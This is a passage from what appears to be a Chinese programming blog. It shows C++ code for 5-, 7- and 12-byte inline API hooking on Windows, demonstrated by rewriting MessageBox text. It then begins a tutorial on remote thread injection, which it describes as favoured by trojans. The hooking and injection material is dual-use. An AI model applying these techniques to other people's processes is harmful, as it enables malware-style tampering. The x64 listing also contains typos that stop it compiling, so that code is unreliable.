xxxxxxxx/ E9 xxxxxxxx）</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pszModuleName, <span class="type">const</span> <span class="type">char</span>* pszFuncName, PROC pfnHookFunc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_FuncAddress = (PROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    m_NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xE9&#x27;</span>;</span><br><span class="line">    *(DWORD*)(m_NewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc - (DWORD)m_FuncAddress - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_FuncAddress != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_FuncAddress != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">5</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyMessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UnHook</span>();</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;Hello Dokey&quot;</span>, <span class="string">&quot;Hello Dokey&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">ReHook</span>();</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VA Virtual Address </span></span><br><span class="line"><span class="comment">// HMODULE hModule 模块加载基址 ImageBase  模块句柄</span></span><br><span class="line"><span class="comment">// DWORD  ul_reason_for_call 以什么原因触发的</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// MessageBox(NULL, &quot;Dokey&quot;, &quot;Dokey&quot;, MB_OK);</span></span><br><span class="line">        m_FuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(m_OldBytes, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">memset</span>(m_NewBytes, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">        <span class="built_in">Hook</span>(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>, (PROC)MyMessageBoxA);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="built_in">UnHook</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7字节Inline-Hook（x86）"><a href="#7字节Inline-Hook（x86）" class="headerlink" title="7字节Inline Hook（x86）"></a>7字节Inline Hook（x86）</h2><div class="note message"><p><strong></strong></p><ul><li>5字节<code>Inline Hook</code>通过构造一个jmp指令来修改目标函数入口的字节内容，jmp指令后面的偏移量是由于CPU机器码要求jmp指令后是一个偏移量</li><li>7字节<code>Inline Hook</code>通过修改函数入口的两条指令来完成<ul><li>一条是把目标地址存入寄存器<code>eax</code>中: <code>mov eax, xxxxxxxx / B8 xxxxxxxx</code></li><li>然后用jmp指令直接跳转到寄存器<code>eax</code>中保存的地址: <code>jmp eax / FF E0</code></li><li>通过指令的机器码是不变的，变化的只有地址，需要将目标函数地址保存在从第一至第四字节的位置就可以了</li><li><code>Byte bJmpCode[] = {&#39;\xb8&#39;, &#39;\0&#39;, &#39;\0&#39;, &#39;\0&#39;, &#39;\0&#39;, &#39;\xff&#39;, &#39;\xe0&#39;}</code></li></ul></li></ul></div><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PROC m_FuncAddress;</span><br><span class="line">BYTE m_OldBytes[<span class="number">7</span>];</span><br><span class="line">BYTE m_NewBytes[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pszModuleName, <span class="type">const</span> <span class="type">char</span>* pszFuncName, PROC pfnHookFunc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_FuncAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    m_NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\xb8&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">5</span>] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">6</span>] = <span class="string">&#x27;\xe0&#x27;</span>;</span><br><span class="line">    *(DWORD*)(m_NewBytes + <span class="number">1</span>) = (DWORD)pfnHookFunc;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">7</span>, &amp;dwSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="12字节Inline-Hook（x64）"><a href="#12字节Inline-Hook（x64）" class="headerlink" title="12字节Inline Hook（x64）"></a>12字节Inline Hook（x64）</h2><div class="note message"><p><strong></strong></p><ul><li>原理： <code>mov rax, Address/jmp rax</code>;</li><li>硬编码： <code>Byte[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0}</code></li></ul></div><h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PROC m_FuncAddress;</span><br><span class="line">BYTE m_OldBytes[<span class="number">12</span>];</span><br><span class="line">BYTE m_NewBytes[<span class="number">12</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* pszModulesName, <span class="type">const</span> <span class="type">char</span>* pszFuncName, PROC pfnHookFunc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_FuncAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(pszModuleName), pszFuncName);</span><br><span class="line">    <span class="keyword">if</span> (m_FuncAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">    m_NewBytes[<span class="number">0</span>] = <span class="string">&#x27;\x48&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">1</span>] = <span class="string">&#x27;\xb8&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">10</span>] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line">    m_NewBytes[<span class="number">11</span>] = <span class="string">&#x27;\xe0&#x27;</span>;</span><br><span class="line">    *(DWORD64*)(m_NewBytes + <span class="number">2</span>) = (DWORD64)pfnHookFunc;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SITE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_OldBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ReHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m_FuncAddress == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    SIZTE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), m_FuncAddress, m_NewBytes, <span class="number">12</span>, &amp;dwSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyMessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UnHook</span>();</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">MessageBoxA</span>(hWnd, <span class="string">&quot;Dokey 12&quot;</span>, <span class="string">&quot;Dokey 12&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">ReHook</span>();</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyMessageBoxW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UnHook</span>();</span><br><span class="line">    <span class="type">int</span> nRet = <span class="built_in">MessageBoxW</span>(hWnd, <span class="string">L&quot;Dokey 12&quot;</span>, <span class="string">L&quot;Dokey 12&quot;</span>, uType);</span><br><span class="line">    <span class="built_in">ReHook</span>();</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MyMessageBox MyMessageBoxW</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> MessageBoxText = <span class="string">&quot;MessageBoxW&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MyMessageBox MyMessageBoxA</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> MessageBoxText = <span class="string">&quot;MessageBoxA&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程线程注入</title>
      <link href="/cf459526.html"/>
      <url>/cf459526.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><ul><li>远程线程注入是指一个进程在另一个进程中创建线程的技术。是一种病毒木马所青睐的注入技术。</li></ul></div><span id="more"></span><h2 id="CreateRemoteThread-远程线程注入"><a href="#CreateRemoteThread-远程线程注入" class="headerlink" title="CreateRemoteThread 远程线程注入"></a>CreateRemoteThread 远程线程注入</h2><h3 id="OpenProcess-函数"><a href="#OpenProcess-函数" class="headerlink" title="OpenProcess 函数"></a>OpenProcess 函数</h3><blockquote><p>打开现有的本地进程对象</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwProcessId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>OpenProcess</strong></p><ul><li><code>dwDesiredAccess</code>: 访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或多个进程访问权限。</li><li><code>bInheritHandle</code>: 此进程创建的进程是否可以继承该句柄</li><li><code>dwProcessId</code>: 要打开的本地进程PID</li></ul><hr><ul><li>如果函数成功，则返回值是打开指定进程的句柄</li><li>如果函数失败，则返回值为NULL</li></ul></div><h3 id="VirtualAllocEx-函数"><a href="#VirtualAllocEx-函数" class="headerlink" title="VirtualAllocEx 函数"></a>VirtualAllocEx 函数</h3><blockquote><p>在指定进程的虚拟地址空间内保留、提交或更改内存状态</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>VirtualAllocEx</strong></p><ul><li><code>hProcess</code>: 进程句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有<code>PROCESS_VM_OPERATION</code>权限</li><li><code>lpAddress</code>: 指定要分配页面所需起始地址的指针。如果<code>lpAddress</code>为NULL，则该函数自动分配内存</li><li><code>dwSize</code>: 要分配内存大小，以字节为单位</li><li><code>flAllocationType</code>: 内存分配类型。此参数必须为以下值之一</li></ul><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>MEM_COMMIT</td><td>在磁盘分页和整体内存中，为指定预留内存页分配内存</td></tr><tr><td>MEM_RESERVE</td><td>保留进程中虚拟地址空间的范围，但不会在磁盘或内存上的分页文件中分配任何实际物理存储位置</td></tr><tr><td>MEM_RESET</td><td>表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入</td></tr><tr><td>MEM_RESET_UNDO</td><td>只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO</td></tr></tbody></table><ul><li><code>flProtect</code>: 要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则<code>flProtect</code>不能是以下值之一<ul><li><code>PAGE_NOACCESS</code></li><li><code>PAGE_GUARD</code></li><li><code>PAGE_NOCACHE</code></li><li><code>PAGE_WRITECOMBINE</code></li></ul></li></ul><hr><p>如果函数成功，则返回值是分配页面的基址<br>如果函数失败，则返回值为NULL</p></div><h3 id="WriteProcessMemory-函数"><a href="#WriteProcessMemory-函数" class="headerlink" title="WriteProcessMemory 函数"></a>WriteProcessMemory 函数</h3><blockquote><p>在指定进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>WriteProcessMemory</strong></p><ul><li><code>hProcess</code>: 要修改的进程内存句柄。句柄必须具有PROCESS_VM_WRITE 和 PROCESS_VM_OPERATION访问权限</li><li><code>lpBaseAddress</code>: 指向指定进程中写入数据的基地址指针。在数据传输之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败</li><li><code>lpBuffer</code>: 指向缓冲区指针。其中包含要写入指定进程的地址空间中的数据</li><li><code>nSize</code>: 要写入指定进程的字节数</li><li><code>lpNumberOfBytesWritten</code>: 指向变量指针，该变量接收传输到指定进程的字节数。如果<code>lpNumberOfBytesWritten</code>为NULL，则忽略该参数</li></ul><hr><p>如果函数成功，则返回值不为零<br>如果函数失败，则返回值为零</p></div><h3 id="CreateRemoteThread-函数"><a href="#CreateRemoteThread-函数" class="headerlink" title="CreateRemoteThread 函数"></a>CreateRemoteThread 函数</h3><blockquote><p>在另一个进程的虚拟地址空间中创建运行的线程</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><div class="note red bug"><p><strong>CreateRemoteThread</strong></p><ul><li><code>hProcess</code>: 要创建线程的进程句柄。句柄必须具有<code>PROCESS_CREATE_THREAD</code>、<code>PROCESS_QUERY_INFORMATION</code>、<code>PROCESS_VM_OPERATION</code>、<code>PROCESS_VM_WRITE</code>和<code>PEOCESS_VM_READ</code>访问权限</li><li><code>lpThreadAttributes</code>: 指向<code>SECURITY_ATTRIBUTES</code>结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果<code>lpThreadAttributes</code>为NULL，则线程将获得默认的安全描述符，并且不能继承该句柄</li><li><code>dwStackSize</code>: 堆栈的初始化大小，以字节为单位。如果此参数为0，则新线程使用可执行文件的默认大小</li><li><code>lpStartAddress</code>: 指向由线程执行类型为<code>LPTHREAD_START_ROUTINE</code>的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中</li><li><code>lpParameter</code>: 指向要传递给线程函数的变量指针</li><li><code>dwCreationFlags</code>: 控制线程创建的标志，若是0，则表示线程在创建后立即执行</li><li><code>lpThreadId</code>: 指向接收线程标识符的变量指针。如果此参数为NULL，则不返回线程标识符</li></ul><hr><p>如果函数成功，则返回值是新线程的句柄<br>如果函数失败，则返回值为NULL</p></div><h3 id="远程线程注入代码实现"><a href="#远程线程注入代码实现" class="headerlink" title="远程线程注入代码实现"></a>远程线程注入代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Inject</span><span class="params">(DWORD dwPid, <span class="type">const</span> WCHAR* szPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开进程</span></span><br><span class="line">    HANDLE hProcess = <span 